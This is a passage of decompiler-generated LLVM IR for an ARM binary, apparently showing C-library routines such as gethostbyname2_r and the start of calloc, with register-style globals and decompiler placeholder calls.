  br label %dec_label_pc_17610

dec_label_pc_175fc:                               ; preds = %dec_label_pc_175e4
  %v2_175fc = icmp eq i8 %v2_175d0, 0
  %v1_17600 = add i32 %v0_17600, 1
  store i32 %v1_17600, i32* %r0.global-to-local, align 4
  br i1 %v2_175fc, label %dec_label_pc_17610, label %dec_label_pc_17608

dec_label_pc_17608:                               ; preds = %dec_label_pc_175fc
  %v1_17608 = and i32 %v6_175d8, 32
  %v2_17608 = icmp eq i32 %v1_17608, 0
  br i1 %v2_17608, label %dec_label_pc_1764c, label %dec_label_pc_17610

dec_label_pc_17610:                               ; preds = %dec_label_pc_17608, %dec_label_pc_175fc, %dec_label_pc_175f4
  %v0_1759812 = phi i32 [ %v1_17600, %dec_label_pc_17608 ], [ %v1_17600, %dec_label_pc_175fc ], [ %v1_175f4, %dec_label_pc_175f4 ]
  %v4_17610 = mul i32 %v1_17610, 256
  %v5_17610 = or i32 %v0_17610, %v4_17610
  %v1_17614 = add nuw nsw i32 %v0_17614, 1
  %v7_1761c = icmp slt i32 %v1_17614, 5
  br i1 %v7_1761c, label %dec_label_pc_17598, label %dec_label_pc_17620

dec_label_pc_17620:                               ; preds = %dec_label_pc_17610
  %v2_17620 = icmp eq i32 %arg2, 0
  br i1 %v2_17620, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_17620
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

bb:                                               ; preds = %dec_label_pc_17620
  %v4_17624 = udiv i32 %v5_17610, 16777216
  %v2_17628 = udiv i32 %v5_17610, 256
  %v5_1762c = and i32 %v2_17628, 65280
  %v2_17630 = and i32 %v5_17610, ptrtoint (i32* @global_var_ff00.41 to i32)
  %v5_17634 = mul i32 %v2_17630, 256
  %v5_17638 = mul i32 %v0_17610, 16777216
  %v6_1762c = or i32 %v4_17624, %v5_17638
  %v6_17634 = or i32 %v6_1762c, %v5_1762c
  %v6_17638 = or i32 %v6_17634, %v5_17634
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17644 = inttoptr i32 %arg2 to i32*
  store i32 %v6_17638, i32* %v3_17644, align 4
  %v2_17650.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17654.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

dec_label_pc_1764c:                               ; preds = %dec_label_pc_175ec, %dec_label_pc_17608, %dec_label_pc_17598, %dec_label_pc_175b8, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17650

dec_label_pc_17650:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1764c
  %v1_17654 = phi i32 [ %v1_17654.pre, %bb ], [ 0, %dec_label_pc_1764c ], [ 1, %.thread7.thread ]
  %v2_17650 = phi i32 [ %v2_17650.pre, %bb ], [ %v3_17568, %dec_label_pc_1764c ], [ %v3_17568, %.thread7.thread ]
  store i32 %v2_17650, i32* @r4, align 4
  ret i32 %v1_17654

; uselistorder directives
  uselistorder i32 %v1_17614, { 1, 0 }
  uselistorder i32 %v5_17610, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17600, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_17650, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1764c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_175d0, { 1, 0 }
  uselistorder label %dec_label_pc_17598, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_17660 = load i32, i32* @r6, align 4
  %v12_17660 = load i32, i32* @r7, align 4
  %v15_17660 = load i32, i32* @r8, align 4
  %v18_17660 = load i32, i32* @sb, align 4
  %v21_17660 = load i32, i32* @sl, align 4
  %v7_17664 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_17664, label %dec_label_pc_17688, label %dec_label_pc_176a8

dec_label_pc_17688:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_176a0 = call i32 @gethostbyname_r()
  store i32 %v0_176a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_178f4

dec_label_pc_176a8:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_176b0 = icmp eq i32 %arg2, 10
  %v2_176b4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_176b4, align 4
  br i1 %v7_176b0, label %dec_label_pc_176bc, label %dec_label_pc_178f0

dec_label_pc_176bc:                               ; preds = %dec_label_pc_176a8
  %v1_176bc = load i32, i32* @r7, align 4
  %v9_176bc = icmp eq i32 %v1_176bc, %arg1
  br i1 %v9_176bc, label %dec_label_pc_178f0, label %dec_label_pc_176c4

dec_label_pc_176c4:                               ; preds = %dec_label_pc_176bc
  %v0_176c4 = call i32 @__GI___errno_location()
  store i32 %v0_176c4, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_176c4, i32* @r5, align 4
  %v0_176d0 = load i32, i32* @r4, align 4
  %v0_176d4 = load i32, i32* @r6, align 4
  store i32 %v0_176d4, i32* %r2.global-to-local, align 4
  %v1_176d8 = inttoptr i32 %v0_176c4 to i32*
  %v2_176d8 = load i32, i32* %v1_176d8, align 4
  store i32 %v2_176d8, i32* @r4, align 4
  %v0_176dc = load i32, i32* @r8, align 4
  store i32 %v0_176dc, i32* %r3.global-to-local, align 4
  %v0_176e0 = load i32, i32* @r7, align 4
  store i32 %v0_176e0, i32* %v1_176d8, align 4
  %v0_176e4 = load i32, i32* @sb, align 4
  store i32 %v0_176e4, i32* %r0.global-to-local, align 4
  %v2_176e8 = load i32, i32* @sl, align 4
  %v5_176e8 = load i32, i32* %ip.global-to-local, align 4
  %v0_176ec = load i32, i32* @fp, align 4
  %v7_176f0 = call i32 @__get_hosts_byname_r(i32 %v0_176e4, i32 %v0_176d0, i32 %v0_176d4, i32 %v0_176dc, i32 %v2_176e8, i32 %v5_176e8, i32 %v0_176ec)
  store i32 %v7_176f0, i32* %r0.global-to-local, align 4
  %v2_176f4 = icmp eq i32 %v7_176f0, 0
  br i1 %v2_176f4, label %bb, label %dec_label_pc_17700

bb:                                               ; preds = %dec_label_pc_176c4
  %v1_176f8 = load i32, i32* @r4, align 4
  %v2_176f8 = load i32, i32* @r5, align 4
  %v3_176f8 = inttoptr i32 %v2_176f8 to i32*
  store i32 %v1_176f8, i32* %v3_176f8, align 4
  br label %dec_label_pc_178f4

dec_label_pc_17700:                               ; preds = %dec_label_pc_176c4
  %v0_17700 = load i32, i32* @fp, align 4
  %v1_17700 = inttoptr i32 %v0_17700 to i32*
  %v2_17700 = load i32, i32* %v1_17700, align 4
  store i32 %v2_17700, i32* %r3.global-to-local, align 4
  %v7_17704 = icmp eq i32 %v2_17700, 1
  br i1 %v7_17704, label %dec_label_pc_17720, label %dec_label_pc_1770c

dec_label_pc_1770c:                               ; preds = %dec_label_pc_17700
  %v7_1770c = icmp eq i32 %v2_17700, 4
  br i1 %v7_1770c, label %dec_label_pc_1773c, label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %dec_label_pc_1770c
  %v3_17714 = icmp eq i32 %v2_17700, -1
  br i1 %v3_17714, label %dec_label_pc_17730, label %dec_label_pc_178f4

dec_label_pc_17720:                               ; preds = %dec_label_pc_17700
  %v7_17720 = icmp eq i32 %v7_176f0, 2
  br i1 %v7_17720, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_17720
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_17740

.thread1:                                         ; preds = %dec_label_pc_17720
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_17740

dec_label_pc_17730:                               ; preds = %dec_label_pc_17714
  %v0_17730 = load i32, i32* @r5, align 4
  %v1_17730 = inttoptr i32 %v0_17730 to i32*
  %v2_17730 = load i32, i32* %v1_17730, align 4
  store i32 %v2_17730, i32* %r3.global-to-local, align 4
  %v7_17734 = icmp eq i32 %v2_17730, 2
  br i1 %v7_17734, label %dec_label_pc_1773c, label %dec_label_pc_178f4

dec_label_pc_1773c:                               ; preds = %dec_label_pc_17730, %dec_label_pc_1770c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %bb29, %.thread1, %dec_label_pc_1773c
  %v0_17740 = load i32, i32* @r8, align 4
  %v1_17740 = sub i32 0, %v0_17740
  %v1_17744 = urem i32 %v1_17740, 4
  store i32 %v1_17744, i32* %r0.global-to-local, align 4
  %v1_17748 = load i32, i32* @sl, align 4
  %v2_17748 = sub i32 %v1_17748, %v1_17744
  %v1_1774c = add i32 %v2_17748, -24
  store i32 %v1_1774c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_17758 = load i32, i32* @r4, align 4
  %v1_17758 = load i32, i32* @r5, align 4
  %v2_17758 = inttoptr i32 %v1_17758 to i32*
  store i32 %v0_17758, i32* %v2_17758, align 4
  %v7_1775c = icmp sgt i32 %v1_1774c, 255
  br i1 %v7_1775c, label %dec_label_pc_17768, label %bb30

bb30:                                             ; preds = %dec_label_pc_17740
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_17760 = load i32, i32* %r3.global-to-local, align 4
  %v1_17760 = load i32, i32* @fp, align 4
  %v2_17760 = inttoptr i32 %v1_17760 to i32*
  store i32 %v0_17760, i32* %v2_17760, align 4
  br label %dec_label_pc_178f4

dec_label_pc_17768:                               ; preds = %dec_label_pc_17740
  %v0_177603 = load i32, i32* %r3.global-to-local, align 4
  %v1_177604 = load i32, i32* @fp, align 4
  %v2_177605 = inttoptr i32 %v1_177604 to i32*
  store i32 %v0_177603, i32* %v2_177605, align 4
  %v0_17768 = load i32, i32* @r8, align 4
  %v1_17768 = load i32, i32* %r0.global-to-local, align 4
  %v2_17768 = add i32 %v1_17768, %v0_17768
  store i32 %v2_17768, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_17770 = add i32 %v2_17768, 16
  store i32 %v1_17770, i32* %r2.global-to-local, align 4
  %v1_17774 = add i32 %v2_17768, 24
  store i32 %v1_17774, i32* @r5, align 4
  %v3_1777c = inttoptr i32 %v1_17770 to i32*
  store i32 %v2_17768, i32* %v3_1777c, align 4
  %v0_17780 = load i32, i32* @sb, align 4
  store i32 %v0_17780, i32* @r1, align 4
  %v0_17784 = load i32, i32* @r4, align 4
  %v1_17784 = load i32, i32* %r2.global-to-local, align 4
  %v2_17784 = add i32 %v1_17784, 4
  %v3_17784 = inttoptr i32 %v2_17784 to i32*
  store i32 %v0_17784, i32* %v3_17784, align 4
  %v0_17788 = load i32, i32* @r5, align 4
  store i32 %v0_17788, i32* %r0.global-to-local, align 4
  %v0_1778c = load i32, i32* @sl, align 4
  store i32 %v0_1778c, i32* %r2.global-to-local, align 4
  %v3_17790 = call i32 @strncpy(i32 %v0_17788, i32 %v0_17780, i32 %v0_1778c)
  %v0_17794 = load i32, i32* @r4, align 4
  %v1_17794 = trunc i32 %v0_17794 to i8
  %v2_17794 = load i32, i32* @r5, align 4
  %v3_17794 = load i32, i32* @sl, align 4
  %v4_17794 = add i32 %v3_17794, %v2_17794
  %v5_17794 = inttoptr i32 %v4_17794 to i8*
  store i8 %v1_17794, i8* %v5_17794, align 1
  %v0_17798 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_177a0 = load i32, i32* @r8, align 4
  store i32 %v0_177a0, i32* %r2.global-to-local, align 4
  %v3_177a4 = inttoptr i32 %v0_17798 to i8*
  %v4_177a4 = call i32 @inet_pton(i32 10, i8* %v3_177a4, i32 %v0_177a0)
  store i32 %v4_177a4, i32* %r0.global-to-local, align 4
  %v1_177a8 = load i32, i32* @r4, align 4
  %v9_177a8 = icmp eq i32 %v4_177a4, %v1_177a8
  br i1 %v9_177a8, label %dec_label_pc_177e0, label %dec_label_pc_177b0

dec_label_pc_177b0:                               ; preds = %dec_label_pc_17768
  store i32 %v1_17770, i32* @ip, align 4
  %v0_177b8 = load i32, i32* @r6, align 4
  store i32 %v0_177b8, i32* %v2_176b4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_177c0 = load i32, i32* @r6, align 4
  %v2_177c0 = add i32 %v1_177c0, 8
  %v3_177c0 = inttoptr i32 %v2_177c0 to i32*
  store i32 10, i32* %v3_177c0, align 4
  %v0_177c4 = load i32, i32* @r4, align 4
  store i32 %v0_177c4, i32* %r0.global-to-local, align 4
  %v0_177c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_177c8 = add i32 %v0_177c8, 6
  store i32 %v1_177c8, i32* %r3.global-to-local, align 4
  %v1_177cc = load i32, i32* @r6, align 4
  %v2_177cc = add i32 %v1_177cc, 12
  %v3_177cc = inttoptr i32 %v2_177cc to i32*
  store i32 %v1_177c8, i32* %v3_177cc, align 4
  %v0_177d0 = load i32, i32* @r5, align 4
  %v1_177d0 = load i32, i32* @r6, align 4
  %v2_177d0 = inttoptr i32 %v1_177d0 to i32*
  store i32 %v0_177d0, i32* %v2_177d0, align 4
  %v0_177d4 = load i32, i32* @ip, align 4
  %v1_177d4 = load i32, i32* @r6, align 4
  %v2_177d4 = add i32 %v1_177d4, 16
  %v3_177d4 = inttoptr i32 %v2_177d4 to i32*
  store i32 %v0_177d4, i32* %v3_177d4, align 4
  %v0_177d8 = load i32, i32* @r4, align 4
  %v1_177d8 = load i32, i32* @fp, align 4
  %v2_177d8 = inttoptr i32 %v1_177d8 to i32*
  store i32 %v0_177d8, i32* %v2_177d8, align 4
  br label %dec_label_pc_178f4

dec_label_pc_177e0:                               ; preds = %dec_label_pc_17768
  %v0_177e0 = load i32, i32* @r7, align 4
  %v2_177e0 = icmp eq i32 %v0_177e0, 0
  br i1 %v2_177e0, label %dec_label_pc_177e8, label %dec_label_pc_178e0

dec_label_pc_177e8:                               ; preds = %dec_label_pc_177e0
  %v2_177e8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_177e8, i32* @r4, align 4
  store i32 %v2_177e8, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_177f8 = bitcast i32* %stack_var_-84 to i8*
  %v3_177f8 = call i32 @__GI_memset(i8* %v2_177f8, i32 0)
  store i32 %v3_177f8, i32* %r0.global-to-local, align 4
  %v2_17800 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17800, i32* @sb, align 4
  %v7_17840 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %dec_label_pc_17858, %dec_label_pc_177e8
  store i32 %v2_17800, i32* %r2.global-to-local, align 4
  store i32 %v2_177e8, i32* %r3.global-to-local, align 4
  %v0_17810 = load i32, i32* @r5, align 4
  store i32 %v0_17810, i32* %r0.global-to-local, align 4
  %v4_17814 = inttoptr i32 %v0_17810 to i8*
  %v5_17814 = call i32 @__dns_lookup(i8* %v4_17814, i32 28, i32 %v2_17800, i32 %v2_177e8)
  store i32 %v5_17814, i32* @r4, align 4
  %v1_17818 = icmp slt i32 %v5_17814, 0
  %v0_1781c = load i32, i32* @sl, align 4
  store i32 %v0_1781c, i32* %r2.global-to-local, align 4
  %v0_17820 = load i32, i32* @r7, align 4
  %v1_17820 = add i32 %v0_17820, 1
  store i32 %v1_17820, i32* @r7, align 4
  %v0_17824 = load i32, i32* @r5, align 4
  store i32 %v0_17824, i32* %r0.global-to-local, align 4
  br i1 %v1_17818, label %dec_label_pc_178e0, label %dec_label_pc_1782c

dec_label_pc_1782c:                               ; preds = %dec_label_pc_17804
  %v3_1782c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1782c, i32* @r1, align 4
  %v3_17830 = call i32 @strncpy(i32 %v0_17824, i32 %v3_1782c, i32 %v0_1781c)
  %v3_17834 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_17834, i32* @r0, align 4
  %v0_17838 = call i32 @free()
  store i32 %v0_17838, i32* %r0.global-to-local, align 4
  %v0_17844 = load i32, i32* @r4, align 4
  store i32 %v0_17844, i32* %r2.global-to-local, align 4
  %v0_17848 = load i32, i32* @r5, align 4
  store i32 %v0_17848, i32* @r3, align 4
  br i1 %v7_17840, label %dec_label_pc_17850, label %dec_label_pc_17888

dec_label_pc_17850:                               ; preds = %dec_label_pc_1782c
  %v0_17850 = load i32, i32* @r7, align 4
  %v8_17854 = icmp sgt i32 %v0_17850, 5
  br i1 %v8_17854, label %dec_label_pc_1787c, label %dec_label_pc_17858

dec_label_pc_17858:                               ; preds = %dec_label_pc_17850
  store i32 %tmp8, i32* @r1, align 4
  %v3_1785c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1785c, i32* %r0.global-to-local, align 4
  %v0_17860 = load i32, i32* @sl, align 4
  %v5_17864 = call i32 @__decode_dotted(i32 %v3_1785c, i32 %tmp8, i32 %v0_17844, i32 %v0_17848, i32 %v0_17860)
  store i32 %v5_17864, i32* @r4, align 4
  %v3_1786c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1786c, i32* @r0, align 4
  %v0_17870 = call i32 @free()
  store i32 %v0_17870, i32* %r0.global-to-local, align 4
  %v0_17874 = load i32, i32* @r4, align 4
  %v1_17874 = icmp slt i32 %v0_17874, 0
  br i1 %v1_17874, label %dec_label_pc_1787c, label %dec_label_pc_17804

dec_label_pc_1787c:                               ; preds = %dec_label_pc_17858, %dec_label_pc_17850
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178e8

dec_label_pc_17888:                               ; preds = %dec_label_pc_1782c
  %v7_17888 = icmp eq i32 %tmp9, 28
  br i1 %v7_17888, label %dec_label_pc_17890, label %dec_label_pc_178d8

dec_label_pc_17890:                               ; preds = %dec_label_pc_17888
  store i32 16, i32* @r2, align 4
  %v0_17898 = load i32, i32* @r8, align 4
  store i32 %v0_17898, i32* @r0, align 4
  %v0_1789c = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_17770, i32* %r2.global-to-local, align 4
  %v1_178a8 = load i32, i32* @r6, align 4
  %v2_178a8 = add i32 %v1_178a8, 8
  %v3_178a8 = inttoptr i32 %v2_178a8 to i32*
  store i32 10, i32* %v3_178a8, align 4
  %v0_178ac = load i32, i32* %r3.global-to-local, align 4
  %v1_178ac = add i32 %v0_178ac, 6
  store i32 %v1_178ac, i32* %r3.global-to-local, align 4
  %v1_178b0 = load i32, i32* @r6, align 4
  %v2_178b0 = add i32 %v1_178b0, 12
  %v3_178b0 = inttoptr i32 %v2_178b0 to i32*
  store i32 %v1_178ac, i32* %v3_178b0, align 4
  %v3_178b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_178b4, i32* @r0, align 4
  %v0_178b8 = load i32, i32* @r5, align 4
  %v1_178b8 = load i32, i32* @r6, align 4
  %v2_178b8 = inttoptr i32 %v1_178b8 to i32*
  store i32 %v0_178b8, i32* %v2_178b8, align 4
  %v0_178bc = load i32, i32* %r2.global-to-local, align 4
  %v1_178bc = load i32, i32* @r6, align 4
  %v2_178bc = add i32 %v1_178bc, 16
  %v3_178bc = inttoptr i32 %v2_178bc to i32*
  store i32 %v0_178bc, i32* %v3_178bc, align 4
  %v0_178c0 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_178d0 = load i32, i32* @r6, align 4
  store i32 %v0_178d0, i32* %v2_176b4, align 4
  %v0_178e8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178e8

dec_label_pc_178d8:                               ; preds = %dec_label_pc_17888
  %v3_178d8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_178d8, i32* @r0, align 4
  %v0_178dc = call i32 @free()
  store i32 %v0_178dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_17804, %dec_label_pc_177e0, %dec_label_pc_178d8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_178e8

dec_label_pc_178e8:                               ; preds = %dec_label_pc_17890, %dec_label_pc_1787c, %dec_label_pc_178e0
  %v0_178e8 = phi i32 [ %v0_178e8.pre, %dec_label_pc_17890 ], [ 3, %dec_label_pc_1787c ], [ 1, %dec_label_pc_178e0 ]
  %v1_178e8 = load i32, i32* @fp, align 4
  %v2_178e8 = inttoptr i32 %v1_178e8 to i32*
  store i32 %v0_178e8, i32* %v2_178e8, align 4
  br label %dec_label_pc_178f4

dec_label_pc_178f0:                               ; preds = %dec_label_pc_176a8, %dec_label_pc_176bc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_178f4

dec_label_pc_178f4:                               ; preds = %bb, %bb30, %dec_label_pc_17730, %dec_label_pc_17714, %dec_label_pc_178e8, %dec_label_pc_177b0, %dec_label_pc_17688, %dec_label_pc_178f0
  store i32 %v9_17660, i32* @r6, align 4
  store i32 %v12_17660, i32* @r7, align 4
  store i32 %v15_17660, i32* @r8, align 4
  store i32 %v18_17660, i32* @sb, align 4
  store i32 %v21_17660, i32* @sl, align 4
  %v1_178fc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_178fc

; uselistorder directives
  uselistorder i32 %v2_177e8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_17770, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17744, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_178f4, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_178f0, { 1, 0 }
  uselistorder label %dec_label_pc_178e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_178e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17740, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_17900 = load i32, i32* @r4, align 4
  %v6_17900 = load i32, i32* @r5, align 4
  %v9_17900 = load i32, i32* @r6, align 4
  %v12_17900 = load i32, i32* @lr, align 4
  %v2_17908 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_17918 = mul i32 %arg2, %arg1
  store i32 %v2_17918, i32* @r6, align 4
  br i1 %v2_17908, label %dec_label_pc_17948, label %dec_label_pc_17920

dec_label_pc_17920:                               ; preds = %entry
  %v2_17928 = udiv i32 %v2_17918, %arg1
  %v9_1792c = icmp eq i32 %v2_17928, %arg2
  br i1 %v9_1792c, label %dec_label_pc_17948, label %dec_label_pc_17934

dec_label_pc_17934:                               ; preds = %dec_label_pc_17920
  %v0_17934 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17940 = inttoptr i32 %v0_17934 to i32*
  store i32 12, i32* %v2_17940, align 4
  br label %dec_label_pc_17a0c

dec_label_pc_17948:                               ; preds = %dec_label_pc_17920, %entry
  %v4_1794c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 72) to i32*), align 4
  store i32 %v4_1794c, i32* @r4, align 4
  %v4_17964 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  store i32 %v4_17964, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17964)
  %v0_17978 = load i32, i32* @r5, align 4
  %v2_17978 = add i32 %v0_17978, 16
  %v3_17978 = inttoptr i32 %v2_17978 to i32*
  %v4_17978 = load i32, i32* %v3_17978, align 4
  store i32 %v4_17978, i32* %ip.global-to-local, align 4
  store i32 96644, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17978)
  %v0_17984 = load i32, i32* @r6, align 4
  %v1_17988 = call i32 @malloc(i32 %v0_17984)
  store i32 %v1_17988, i32* %r4.global-to-local, align 4
  %v2_1798c = icmp eq i32 %v1_17988, 0
  br i1 %v2_1798c, label %.thread, label %dec_label_pc_17994

dec_label_pc_17994:                               ; preds = %dec_label_pc_17948
  %v1_17994 = add i32 %v1_17988, -4
  %v2_17994 = inttoptr i32 %v1_17994 to i32*
  %v3_17994 = load i32, i32* %v2_17994, align 4
  %v1_17998 = and i32 %v3_17994, 2
  %v2_17998 = icmp eq i32 %v1_17998, 0
  br i1 %v2_17998, label %dec_label_pc_179a0, label %.thread

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17994
  %v1_179a06 = add i32 %v3_17994, -4
  %v1_179a4 = and i32 %v1_179a06, -4
  store i32 %v1_179a4, i32* @r2, align 4
  %v3_179a8 = udiv i32 %v1_179a4, 4
  store i32 %v3_179a8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_179a4, 36
  %v2_179b0 = icmp ult i32 %v1_179a4, 33
  %v3_179b0 = or i1 %tmp, %v2_179b0
  br i1 %v3_179b0, label %dec_label_pc_179bc, label %dec_label_pc_179b4

dec_label_pc_179b4:                               ; preds = %dec_label_pc_179a0
  %v2_179b4 = inttoptr i32 %v1_17988 to i8*
  %v3_179b4 = call i32 @__GI_memset(i8* %v2_179b4, i32 0)
  br label %.thread

dec_label_pc_179bc:                               ; preds = %dec_label_pc_179a0
  %tmp7 = icmp eq i32 %v1_179a4, 16
  %v2_179c0 = inttoptr i32 %v1_17988 to i32*
  store i32 0, i32* %v2_179c0, align 4
  %v1_179c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_179c4 = add i32 %v1_179c4, 4
  %v3_179c4 = inttoptr i32 %v2_179c4 to i32*
  store i32 0, i32* %v3_179c4, align 4
  %v1_179c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_179c8 = add i32 %v1_179c8, 8
  %v3_179c8 = inttoptr i32 %v2_179c8 to i32*
  store i32 0, i32* %v3_179c8, align 4
  %v2_179cc = icmp ult i32 %v1_179a4, 13
  %v3_179cc = or i1 %tmp7, %v2_179cc
  br i1 %v3_179cc, label %.thread, label %dec_label_pc_179d0

dec_label_pc_179d0:                               ; preds = %dec_label_pc_179bc
  %v0_179d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_179d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_179d4 = add i32 %v1_179d4, 12
  %v3_179d4 = inttoptr i32 %v2_179d4 to i32*
  store i32 0, i32* %v3_179d4, align 4
  %v1_179d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_179d8 = add i32 %v1_179d8, 16
  %v3_179d8 = inttoptr i32 %v2_179d8 to i32*
  store i32 0, i32* %v3_179d8, align 4
  %tmp8 = icmp ult i32 %v0_179d0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_179e0

dec_label_pc_179e0:                               ; preds = %dec_label_pc_179d0
  %v0_179e0 = load i32, i32* %ip.global-to-local, align 4
  %v7_179e0 = icmp eq i32 %v0_179e0, 9
  %v1_179e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_179e4 = add i32 %v1_179e4, 20
  %v3_179e4 = inttoptr i32 %v2_179e4 to i32*
  store i32 0, i32* %v3_179e4, align 4
  %v1_179e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_179e8 = add i32 %v1_179e8, 24
  %v3_179e8 = inttoptr i32 %v2_179e8 to i32*
  store i32 0, i32* %v3_179e8, align 4
  br i1 %v7_179e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_179e0
  %v2_179ec = load i32, i32* %r4.global-to-local, align 4
  %v3_179ec = add i32 %v2_179ec, 32
  %v4_179ec = inttoptr i32 %v3_179ec to i32*
  store i32 0, i32* %v4_179ec, align 4
  %v2_179f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_179f0 = add i32 %v2_179f0, 28
